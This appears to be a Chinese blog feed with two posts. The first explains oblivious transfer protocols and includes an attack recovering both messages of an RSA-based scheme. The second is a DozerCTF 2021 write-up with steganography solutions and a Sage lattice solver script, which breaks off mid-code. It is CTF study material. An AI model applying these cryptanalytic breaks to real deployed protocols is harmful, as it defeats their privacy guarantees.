    <content type="html"><![CDATA[<p>​    </p><p><strong>不经意传输（Oblivious Transfer, OT）</strong>是一种可保护隐私的双方通信协议、接受者的隐私不被发送者所知道，使通信双方以一种选择模糊化的方式传送消息。抽象地讲，就是A给B发消息，A却不知道B收到的是啥，一般的思路就是A要多发一些消息然后让B去选择有需要的，如果是这样的话，同时还应该保证B不会多知道他本不应该知道的消息。不经意传输可以分为1选1、2选1、n选1、n选k多种不经意传输协议。</p><h3 id="1选1"><a href="#1选1" class="headerlink" title="1选1"></a>1选1</h3><p>A给B发送一条消息，B只有 $\frac{1}{2}$ 的概率能够接受到真正的消息，且A不知道B是否真正接受了消息。</p><ol><li><p>A取两个素数 $p,q$，计算 $n=pq$，将 $n$ 发送给B；</p></li><li><p>B任取 $x,x \in (0,n),\gcd(x,n)=1$，计算 $a=x^2 \bmod n$，将 $a$ 发送给A；</p></li><li><p>A知道 $p,q$，可以计算 $a=x^2 \bmod n$ 的四个根 $(x,n-x,y,n-y)$，从中随机挑选一个送给B；</p></li><li><p>B若收到 $y$ 或 $n-y$，则可计算 $p,q$：$\gcd(x+y,n)=p$ 或 $\gcd(x+y,n)=q$；</p><p>B若收到 $x$ 或 $n-x$，则B什么也得不到。</p><p>​    </p></li></ol><h3 id="2选1"><a href="#2选1" class="headerlink" title="2选1"></a>2选1</h3><p>A给B发送两条消息 $(m_0, m_1)$，B能够在不知道另外一条消息的内容的情况下得知其中一条消息的内容，且A不知道B选择的哪条消息。</p><ul><li><h4 id="RSA实现"><a href="#RSA实现" class="headerlink" title="RSA实现"></a>RSA实现</h4><ol><li><p>A有两个秘密消息 $m_0,m_1$；</p></li><li><p>A使用RSA算法，生成公钥 $(N,e)$ 对公开，私钥 $d$ 自己留着。公钥 $(N,e)$ 告知B；</p><p>（每次通信的时候RSA都要重新生成一对公钥私钥）</p></li><li><p>A产生两个随机数 $x_0,x_1$，并且将这两个随机数传输给B；</p></li><li><p>B决定要获取的数字编号 $b=\{0,1\}$，以及产生一个随机数 $k$；</p></li><li><p>B计算一个数字 $v=(x_b+k^e) \bmod N$，并且将这个 $v$ 发送给A；</p></li><li><p>A计算多个 $k_i$，其中一个 $k_i$ 将会等于 $k$：</p><p>$k_0=(v-x_0)^d \bmod N \ k_1=(v-x_1)^d \bmod N$</p><p>由于此时 $v$ 并不是A产生的，所以此时的A并不知道哪一个 $k$ 是B需要的；</p></li><li><p>A将生成的值与自己手上的信息进行相加，得到全新的信息：</p><p>$m_0’=m_0+k_0 \ m_1’=m_1+k_1$</p><p>并将信息发送给B。因为此时每一个信息都增加了 $k_i$，所以B无法直接还原信息 $m$；</p></li><li><p>B此时知道自己选择的信息编号 $b$，于是选出 $m_b$，计算出 $k_b$，并且用 $m_b=m_b’-k_b$ 得到此时的解密信息。</p></li></ol><ul><li><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><ul><li><p>构造 $v$ 得 $m_0,m_1$</p><p>$v=\cfrac{\text{scale}^e \cdot x_0-x_1}{\text{scale}^e-1}$</p><p>可使 $k_1=\text{scale} \cdot k_0$，因此 $\text{scale} \cdot m_0’-m_1’=m_0 \cdot \text{scale} -m_1$。</p><p>首先，如果恰巧随机数 $m_0$ 和 $m_1$ 都小于 $\text{scale}$，那么直接可以从 $m_0 \cdot \text{scale} -m_1$ 将两者求出。</p><p>其次，如果 $\text{scale}$ 取值不能取得太大，而导致两个 $m$ 总是比它大，那只能老老实实穷举可能的低字节，再向高字节搜索。</p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/eAJWraah9OOgJfZOhm4Sqg">Pwnhub - BabyOT</a></p><p><a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/README.md">Hackergame 2020 - 不经意传输</a></p></li></ul></li></ul></li></ul><ul><li><h4 id="其他实现"><a href="#其他实现" class="headerlink" title="其他实现"></a>其他实现</h4><ol><li><p>A发送 $g^s$ 给B，B知道 $g$ 和 $g^s$ 也无法破译 $s$，因为DLP问题不存在高效解法；</p></li><li><p>B基于 $i$ 生成 $L_i=\begin{cases} g^k ,&amp; i=0 \ g^{s-k} ,&amp; i=1 \end{cases}$；</p></li><li><p>B发送 $L_i$ 给A，A知道 $g$ 和 $g_k$ 也无法破译 $k$，因为DLP问题不存在高效解法。</p><p>因此，A无法知道B发来的是 $g_k$ 还是 $g_{s-k}$，也就无法知道 $i$；</p></li><li><p>A生成 $C_0,C_1$：</p><p>$C_0=(g^{r_0},(L_i)^{r_0} \oplus v_0)\ C_1=(g^{r_1},(\frac{g^s}{L_i})^{r_1} \oplus v_1)$</p></li><li><p>A发送 $C_0,C_1$ 给B，B知道 $g,g^{r_0},g^{r_1}$ 也无法破译 $r_0,r_1$，因为DLP问题不存在高效解法。</p></li><li><p>B解密 $v_i$：</p><p>(1) 对于 $i=0$ 的情形：</p><p>B可以通过如下方式解密获得 $v_0$：</p><p>$C_0[0]^k \oplus C_0[1]=(g^{r_0})^k \oplus (L_i)^{r_0} \oplus v_0=(g^{r_0})^k \oplus (g^k)^{r_0} \oplus v_0=v_0$</p><p>B无法获得 $v_1$ 因为 $C_1[1]=(\frac{g^s}{L_i})^{r_1} \oplus v_1=g^{(s-k)r_1} \oplus v_1$，而 B不知道 $s,r_1$。</p><p>(2) 对于 $i=1$ 的情形：</p><p>B可以通过如下方式解密获得 $v_1$：</p><p>$C_1[0]^k \oplus C_1[1]=(g^{r_1})^k \oplus (L_i)^{r_1} \oplus v_1=(g^{r_1})^k \oplus (g^k)^{r_1} \oplus v_1=v_1$</p><p>B无法获得 $v_0$ 因为 $C_0[1]=(L_i)^{r_0} \oplus v_0=g^{(s-k)r_0} \oplus v_0$，而 B不知道 $s,r_0$。</p></li><li><p>因此，B只能解密 $v_i$ 而不能解密 $v_{1-i}$。</p></li></ol></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;不经意传输（Oblivious Transfer, OT）&lt;/strong&gt;是一种可保护隐私的双方通信协议、接受者的隐私不被发送者所知道，使通信双方以一种选择模糊化的方式传送消息。抽象地讲，就是A给B发消息，A却不知道B收到的是啥，</summary>
      
    
    
    
    <category term="crypto" scheme="https://lazzzaro.github.io/categories/crypto/"/>
    
    
    <category term="OT" scheme="https://lazzzaro.github.io/tags/OT/"/>
    
  </entry>
  
  <entry>
    <title>DozerCTF 2021</title>
    <link href="https://lazzzaro.github.io/2021/05/30/match-DozerCTF-2021/"/>
    <id>https://lazzzaro.github.io/2021/05/30/match-DozerCTF-2021/</id>
    <published>2021-05-30T14:23:15.000Z</published>
    <updated>2021-05-30T16:54:45.628Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><blockquote><p>比赛时间：2021年5月29日 9:00-2021年5月30日晚21:30<br>比赛平台：<a href="http://1.14.160.21:8000/">http://1.14.160.21:8000/</a></p></blockquote><p>Web几乎全是域渗透，Crypto几乎全是AES。</p><p>Rank: 12</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="不会有人以为re那道才是签到吧"><a href="#不会有人以为re那道才是签到吧" class="headerlink" title="不会有人以为re那道才是签到吧"></a>不会有人以为re那道才是签到吧</h3><blockquote><p>欢迎参加DozerCTF 2021 <a href="https://www.bilibili.com/video/BV1VK4y1G7HQ">https://www.bilibili.com/video/BV1VK4y1G7HQ</a></p></blockquote><p>视频中后段有闪过的flag，拼手速暂停大法。</p><p>​    </p><h3 id="detective-novel"><a href="#detective-novel" class="headerlink" title="detective_novel"></a>detective_novel</h3><blockquote><p>听说扫一扫就有flag</p></blockquote><p>flag.png 分离出 zip压缩包，在 novel 目录下有两个文件 flag.jpg 和 hint.png。</p><p>hint.png 分离出另一个 zip压缩包，检查发现头部错误且包含伪加密，修复头部 <code>504B03040A000900</code> 为 <code>504B030414000000</code> ，在 easy_riddle 目录下有两个文件 hint.txt 和 letter.png。</p><p>letter.png 福尔摩斯使用过的跳舞小人密码，解出 <code>DOZER</code>，再结合之前 hint.png 内文字 <code>guess what can you get !!!</code>，用 outguess 从 flag.jpg 提取文件得flag：</p><p><code>outguess -r flag.jpg -k DOZER -t out.txt</code></p><p>​    </p><h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><blockquote><p>看不到看不到</p></blockquote><p>xiaojiejie.jpg 分离出一张gif图片和一张png图片。</p><p>gif图片分帧分别扫二维码拼接得前半段 <code>Dozer&#123;is_it_simple</code>，png二维码图片扫码发现文字中间有不可见字符，猜测为零宽隐写，使用 <a href="http://330k.github.io/misc_tools/unicode_steganography.js">unicode_steganography</a> 提取字符：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = unicodeSteganographer</span><br><span class="line">s.setUseChars(<span class="string">&#x27;\u200b\u200c\u200d\u200e\u200f&#x27;</span>);</span><br><span class="line">s.decodeText(<span class="string">&quot;我已经看见了，​​​​‎‏​​​​​‏​‍​​​​‏‍‌​​​​‏‍‏​​​​‎‏​​​​​‏‏‌​​​​‏‍‌​​​​‏‎‍​​​​‌‌‎​​​​‎‏‏​​​​‏‍‌​​​​‏‍​​​​​‏​‎​​​​‏‍‏​​​​‎‏‍​​​​‏‎‌​​​​‏‎‍​​​​‏‌‎​​​​‎‏‍​​​​‏‎‌​​​​‏​‌​​​‌​​​你呢？&quot;</span>)</span><br></pre></td></tr></table></figure><p>解出后半段 <code>_for_you!congratulate&#125;</code></p><p>​    </p><h3 id="funny-pixel"><a href="#funny-pixel" class="headerlink" title="funny_pixel"></a>funny_pixel</h3><blockquote><p>听说国赛有一个running_pixel?</p></blockquote><p>按提示参考ciscn题，提取218张图片里的0/1，可按照0/1图案颜色（RGB: EFEF27）计算像素数来识别：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">219</span>):</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">framepic = Image.<span class="built_in">open</span>(<span class="string">f&quot;./funny_pixel/<span class="subst">&#123;name&#125;</span>.png&quot;</span>)</span><br><span class="line">framepic = framepic.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">width,height = framepic.size</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line"><span class="keyword">if</span> framepic.getpixel((w,h)) == (<span class="number">0xef</span>,<span class="number">0xef</span>,<span class="number">0x27</span>):</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>((name,count))</span><br><span class="line"><span class="keyword">if</span> count != <span class="number">10</span> <span class="keyword">and</span> count != <span class="number">5</span>:</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">flag += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> count == <span class="number">10</span> <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#01000100011011110111101001100101011100100100001101010100010001100111101101000100001100000101111101111001010011110101010101011111010011000100100101101011011001010101111101010000011010010111100001000101011011000111110111</span></span><br></pre></td></tr></table></figure><p>观察得到的0/1字符串，<code>1000100 = D</code>，<code>1101111 = o</code>，类推知每个字符7位二进制中间用0分隔，提取转回字符即为flag：<code>DozerCTF&#123;D0_yOU_LIke_PixEl&#125;</code>。</p><p>​    </p><h3 id="一点也不杂"><a href="#一点也不杂" class="headerlink" title="一点也不杂"></a>一点也不杂</h3><blockquote><p>出题人说，这个题目一点也不杂</p></blockquote><p>三个文件，flag分三部分。</p><p>第一部分，5月日历+图片尾部13组数字，在日历上连线出猪圈密码图案，对照解出 <code>DOYOUKNOW_CRT</code>。</p><p>第二部分，简单中国剩余定理(CRT)应用，Sage运行<code>crt([2,2,9,16],[5,7,17,23])</code>，得key=5007。</p><p>第三部分，直接base85解码得 <code>_good_over&#125;</code></p><p>加头 <code>DozerCTF&#123;</code> 拼接为flag。</p><p>​    </p><h3 id="做个问卷吧"><a href="#做个问卷吧" class="headerlink" title="做个问卷吧"></a>做个问卷吧</h3><blockquote><p>赛题基本上线完毕，感谢参加DozerCTF 2021! 问卷：<a href="https://tp.wjx.top/vj/t2bF3sc.aspx">https://tp.wjx.top/vj/t2bF3sc.aspx</a></p></blockquote><p>反馈+吐槽。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Horcrux"><a href="#Horcrux" class="headerlink" title="Horcrux"></a>Horcrux</h3><blockquote><p>Harry Potter &amp;&amp; Aquila</p></blockquote><p>AeroCTF 2021原题，构造结式解椭圆曲线方程组+LLL算法+恢复参数值，参考：</p><p><a href="https://gist.github.com/hellman/a8c9a09b1ce6959226f9d75cf94b805f">AeroCTF 2021 - Horcrux</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">proof.arithmetic(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x95a599ab706381e861caf2c6e757204c704b77a38592ae0db282000d8537ab0e4608ecd9a524ad6e14eb9564353b5c1036ff13c8503bfad7e8695d0bcf15df766c1be64aa4e73b75e0ecb28ea9e74eafc613d2fb9299fac060826bd071a92d2bd5be44d6d65e6b63146d617e800b79e25358b4a3e22a62457f2d39c21a694f54c03ad5d69a674fa6cd91c2971524152c1b6d177c455e0f255ce4fa18253da252613959c17b49ac422a9009933d0c59210646fca85e8ae35d5df34d6afde9d951909585c3f3e53e06ef5ae319fa035e57941599c2a73133bba490b66ab38e7537fd3ed322bf3a0431f02f276b5b18b623865883e3f0b67a511293b5a7576c97e6663cb1c32bdff5cda825549742d067e1b4ca847c75ef6b601feced3a9bb4dea41f1e5c40a8f2af2983f010d7bbc9ba992cedcdac6922a056d52873af110ae578da5e875fa6a121cdb45fe5e8198c121f7e9609d100d023a9155d6aa9efe28aa9036079564780db663aad36796ee8349b98b11d1b108125</span></span><br><span class="line">F = GF(p)</span><br><span class="line"></span><br><span class="line">x0 = F(<span class="number">0x93436a2bdfecc923d69385f164ef891ef5b08418e5b4e65c980e0b054e86ee8b8e24a527dad9fe3883234179167ada4b5f413c07c548f3dc224db1f2791c8a44bb857c722676d621fa07ad4beee4dc2be679c351cc19423aaff444e5c908b767d9ebec006bf0f020b8c0d15775fc84524333c47d4bc46ae8bd3cb18e1b037e59a388e39a81c1d97c9654742979ed54741df9aba6954c2801efb63d91ed1a51889ee1e8848b7bf111c987cb558e08b9caa17e50f578fa0af70bf855393dcc6c52420897eae663700818dbec237e094c1d4904a249d92702ab4046e52694db73a5fb83953262dff0251fa5fd1b4a99fb70addcde2a38d8766e02360b7b29aad1382ecdd63650f2b597469267dccc11ee7d0b10178c68a02b2d03db5bfcd6d663c11bc2ef855e30528aec48a9f4f53f71c52ac6e0c92fcaf0f8576982b1135bbb15fb5035c7853de51b8aa5b858646dd23b7b01d837c6b3c38f4bdcef6009ee02456bbdcbe8978eb400326c4fd0a899ed9f559ba963b25317</span>)</span><br><span class="line">y0 = F(<span class="number">0x47b8c9d33929bfe12657a2f482213cca803fe37e8485ebde814dc91ce56ed480cea04f24176edce77ebfd7d9bba3a864cfe6176ef1d68ebc184dcde0667704adc472d1d16688affa657cff460edf05f92dad743ca3421150ec7ef98e08a9d17af033a555ed49f0e9c7457bf339a9270e8b44b7b75dd43afd27614d0ce59878c019d902d9ed23a26f04a431130534f85b05db586fd9a65a178204eb7d568a0e64dd16a369d2af6f2b8cd32a9e9be8322885c78a30dc8019ca3c48f39bad38de4ab60970ee1c44688d2afa901f46af7d2e7ced0e34204d6b38330fd87d6bf5bb61378e092780a48b985654de1c65b0a6146a82f84bfe09359820942980ce5c607bfc14497a79436bc4f351ae697875d93049c30dafc698208a17f9b785aa35448e4ef341102053c62a9923287f4cf597ff492fd0eac4ef77ae879a22c6c8a3a53baef09f574316fd872e1a6dd1ad9eb72a3e39f925e25fe06f7983b785dcb110bd127c8e2736e7345fd7ffce687c66c492a541e00c500574</span>)</span><br><span class="line">x1 = F(<span class="number">0x37a181d88a683e2eeba3147bfb3043be6067fc722b8578255e25a335fadda9ead31c41d7742dbf3df7e4c3effc9297ef528730b3d8920978e342e123b9f19ab15a5ed2c19c45aaee728e53acd8c44e7543c4b9bcd40f27b8efac1a1e431ddbab15b4341c6cc817516634c2ab1117e784e429b9f797963b18442127342455d469ca9d9ff24b241afe9b7fdd4b91bb9750710e6f00b9fe631c1db71c308ef4642251fc00d0433910161d588c100944d55935ddf7dc656cc1670065c5bc6607358304c228f8495cca579a3a78102b4e617687f3aad0c5826e3aa7a85c85c99af2254002d3578c0af342ea1f49b9a425eba90e2473470fec77a945b45cf67dde9cb4e0ef445b974164cbcb61ec7cbcd77c94d42c6dce15ae500e4b6b15d38923ba2773176ae1e3354baaae47b422ec0ff8273538ad0a6a03a33d60a52257698130f6db6baaa4d338e167443eb4ac1b57b0d6f424e9d0b2f6b6b0df609b81150928286443afe7d1b9bbb30389af0db1597945d233cd19121d11</span>)</span><br><span class="line">y1 = F(<span class="number">0x7696ea73e7345896be516aac44aa8ba35242babc3853a2a3fbf7081a3f5a845dba81f01d7aba946f7a9886eb1918d367baa87f387e86e095bb88bbc44f58768e8c2db3a1926301c984ea19f8e680fb7f4f7108c4c8565fc7cb66284bdf81e547e446faa80e88a59ceae3bb43b2c6ac1f8858e5f126fcc224f62aef611184d714db86a5c19060e0a9844def0e047d3a46e9d64f42c0cef9f85812068d580f9722b1520c2847b34c6ed7afc89b633113606aa397c10f1ea653e4d15fb160f2c1d4750a6c4eaef7e6fa56c35d393fe7d3ef91fc9ea56a69fd9614e8c39da6dc0981c6004468db1d81a13ebaf3bfd9e640c39b63b107605ba28a5c18b4a03ca627102ff63ddc8483dce2c06e97f614a4d93f9d615f849a6ce0c164217dabe849ceaf1ade997700daf9aca95f7811cc615cf61887e199ddf963a780829cc186b96d96f2b3c1f001eaa0e289b7fc79e5c24ce2aad55f9adb9ecaacba5445773222aee3cf997c171f7bcbcba65caa6c254186a1fa1982521d8ab1</span>)</span><br><span class="line">x2 = F(<span class="number">0x3117ba57d46bd2da19fed7e3f087ec252b45340c1a338a5096a94538be0f9776388ec70cc22c475968a352f2a34f1637b660aea2f5a741d925d550b9bc91f3b5da0e9b6585aee5413d89f6734651439f7c6905c2b98b7e4aef425a50852b626ad7bd2a4f67909acc0d6ac7e33688f3cf676ac3c00a32e12eecb384cd9b099244c2ef37f054a271a2c174f3eac5553415b097ee84b590258df022d1142b28be0ca756784bfae2e42a1bf98a3c48ea9baa2466172673b978d1372a2ac5e20ff869dacbbfe0f56d4d4de947d39a5bb643cd3b00c1e6d4b82e090105358fc105f75ee1dec962696ef406474d5934ed27e375952012bf797ebd8fff2d4b08935086850fc89039b3c4c0ab712a9859c6e43dad3fae4c5048d60a5069c338a63ac49f3a7fa99614bd8a17a9522c82333ecaf88c41b0b8be60ebee5b52df4d853ef397786a113b5064e236299e795dbec72baf001c6dd973e424e86e79368d6b10f3b43a47eb8fae6e48c2b42aa7e2566879f9b675e4837a59366b</span>)</span><br><span class="line">y2 = F(<span class="number">0x1e6d85c241d60abc738c606cc4237a617f7a341934d59cd0a3becbb1f4acdc740673a84df7646d1afd08d0d132d8188a35eca0ca8bee5208b73b141de1c4a4a254c6f6278f6860d8d40d9eb301281373dadb1e9bfbeeaa4b0b1ef48b787b47a490cce2f2c64d03a61036ebe565fe4f93dec2e030ecf1a91d1c65b82dfca045b07c526a87293d4844d92327669ca19a2a2e62d4e6e9d46d24d0994434e52f2ea1e9492d46039959afa75365d88e90ab13097f075c4a93d102514cac901ca760155152788e5d352c09e012f6d87fb262d3db9174014c2d9c88e289c902700dc202b05c0600b3f96be0ffc10ae58738718fee7c21e387ddf390a9a1e26a6cb2b744971b67621c1211f0127969a969318beb60a361b924db7707b4170ed3af22dc412d15eb71c553dc79dbebc238dc2baecea806351288b05db9f6885cc53af7509aa3c810540e648ff5e94ba75bf0dbf097d515babe0f99dcd4ddcc10f7a6549a3f12148ca51e4f4f5ab16bf0cb5c069b2cd87c1738bce308</span>)</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">R = PolynomialRing(F, names=<span class="string">&#x27;aa1, aa2, bb1, bb2, a, b&#x27;</span>)</span><br><span class="line">aa1, aa2, bb1, bb2, a, b = R.gens()</span><br><span class="line">bounds = <span class="built_in">dict</span>(aa1=<span class="number">2</span>**BITS, aa2=<span class="number">2</span>**BITS, bb1=<span class="number">2</span>**BITS, bb2=<span class="number">2</span>**BITS)</span><br><span class="line"></span><br><span class="line">eq0 = x0**<span class="number">3</span> + a*x0 + b - y0**<span class="number">2</span></span><br><span class="line">eq1 = (x1 + aa1)**<span class="number">3</span> + a*(x1 + aa1) + b - (y1 + bb1)**<span class="number">2</span></span><br><span class="line">eq2 = (x2 + aa2)**<span class="number">3</span> + a*(x2 + aa2) + b - (y2 + bb2)**<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resultant</span>(<span class="params">p1, p2, var</span>):</span></span><br><span class="line">    p1 = p1.change_ring(QQ)</span><br><span class="line">    p2 = p2.change_ring(QQ)</span><br><span class="line">    var = var.change_ring(QQ)</span><br><span class="line">    r = p1.resultant(p2, var)</span><br><span class="line">    <span class="keyword">return</span> r.change_ring(F)</span><br><span class="line"></span><br><span class="line">poly = eq0</span><br><span class="line">poly1 = resultant(poly, eq1, b)</span><br><span class="line">poly2 = resultant(poly, eq2, b)</span><br><span class="line">poly = resultant(poly1, poly2, a)</span><br><span class="line">poly /= poly.coefficients()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(poly.monomials())</span><br><span class="line"></span><br><span class="line">bits = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> mono <span class="keyword">in</span> poly.monomials():</span><br><span class="line">    mono_bits = RR(log(mono.change_ring(ZZ).subs(**bounds), <span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(mono, <span class="string">&quot;%.2f&quot;</span> % mono_bits )</span><br><span class="line">    bits += mono_bits</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(poly.monomials())</span><br><span class="line">m = matrix(ZZ, n, n)</span><br><span class="line">m[<span class="number">0</span>] = vector(poly.coefficients())</span><br><span class="line">m[<span class="number">1</span>:,<span class="number">1</span>:] = p * identity_matrix(n-<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prmat</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(*[&#123;<span class="number">0</span>: <span class="string">&quot;0&quot;</span>, <span class="number">1</span>: <span class="string">&quot;1&quot;</span>, p: <span class="string">&quot;p&quot;</span>&#125;.get(v, <span class="string">&quot;x&quot;</span>) <span class="keyword">for</span> v <span class="keyword">in</span> row])</span><br><span class="line">prmat(m)</span><br><span class="line"></span><br><span class="line">monos = vector(poly.change_ring(ZZ).monomials())</span><br><span class="line">factors = [mono(**bounds) <span class="keyword">for</span> mono <span class="keyword">in</span> monos]</span><br><span class="line"></span><br><span class="line">[m.rescale_col(i, factor) <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors)]</span><br><span class="line">m = m.LLL()</span><br><span class="line">m = m.change_ring(QQ)</span><br><span class="line">[m.rescale_col(i, QQ(<span class="number">1</span>)/factor) <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors)]</span><br><span class="line">m = m.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">polys = []</span><br><span class="line"><span class="keyword">for</span> pol <span class="keyword">in</span> m*monos:</span><br><span class="line">    maxval = <span class="built_in">sum</span>(</span><br><span class="line">        (<span class="built_in">abs</span>(<span class="built_in">int</span>(coef)) * mono).change_ring(ZZ).subs(**bounds)</span><br><span class="line">        <span class="keyword">for</span> coef, mono <span class="keyword">in</span> pol</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;polynomial with max value&quot;</span>, RR(log(maxval, <span class="number">2</span>)), <span class="string">&quot;bits&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> maxval &lt; p:</span><br><span class="line">        polys.append(pol)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;got&quot;</span>, <span class="built_in">len</span>(polys), <span class="string">&quot;polynomials&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">hs, <span class="built_in">vars</span>, solbits, padbits=<span class="number">20</span></span>):</span>    </span><br><span class="line">    nbits = solbits + padbits</span><br><span class="line">    <span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line">    sols = &#123;(<span class="number">0</span>,) * <span class="built_in">len</span>(<span class="built_in">vars</span>)&#125;</span><br><span class="line">    polys = [h.change_ring(Zmod(<span class="number">2</span>**nbits)) <span class="keyword">for</span> h <span class="keyword">in</span> hs]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bit&quot;</span>, i, <span class="string">&quot;/&quot;</span>, nbits, <span class="string">&quot;:&quot;</span>, <span class="built_in">len</span>(sols), <span class="string">&quot;candidates&quot;</span>)</span><br><span class="line">        sols2 = <span class="built_in">set</span>()</span><br><span class="line">        mod = <span class="number">2</span>**i</span><br><span class="line">        polys = [h.change_ring(Zmod(<span class="number">2</span>*mod)) <span class="keyword">for</span> h <span class="keyword">in</span> hs]</span><br><span class="line">        <span class="keyword">for</span> bits <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>), repeat=<span class="built_in">len</span>(<span class="built_in">vars</span>)):</span><br><span class="line">            <span class="keyword">for</span> sol <span class="keyword">in</span> sols:</span><br><span class="line">                sol2 = <span 